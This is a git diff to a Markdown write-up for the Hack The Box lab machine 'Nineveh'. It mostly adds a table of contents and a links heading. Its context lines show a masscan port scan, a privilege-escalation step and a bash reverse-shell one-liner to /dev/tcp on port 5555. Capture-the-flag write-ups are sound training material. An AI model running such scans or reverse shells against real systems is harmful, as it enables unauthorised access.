@@ -11,6 +11,13 @@
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7c917943-4148-4819-93a1-4ac511369cca)
 
 
+# Sections
++ [Enumeration](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/08_Nineveh.md#enumeration)
++ [Gaining Access](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/08_Nineveh.md#gaining-access)
++ [Privilege Escalation](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/08_Nineveh.md#privilege-escalation)
++ [Links](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/08_Nineveh.md#links)
+
+
 ## Enumeration
 + `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.43 -e tun0 > ports`
 + `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
@@ -223,6 +230,10 @@ bash -i >& /dev/tcp/10.10.14.18/5555 0>&1
 + Get root shell.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fd0fdf8a-98b4-43b5-af22-3482b41eafe9)
+
+---
+
+# Links
 
 # References & Alternatives
 Try ssh connection [analyzing **secure_notes** image file](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit#id-7b47) and port knocking [1](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/nineveh-writeup-w-o-metasploit#id-7b47)  [2](https://benheater.com/hackthebox-nineveh/#knock-on-the-door)  [3-chisel](https://benheater.com/hackthebox-nineveh/#port-knock-workaround-chisel) methods for more alternatives.
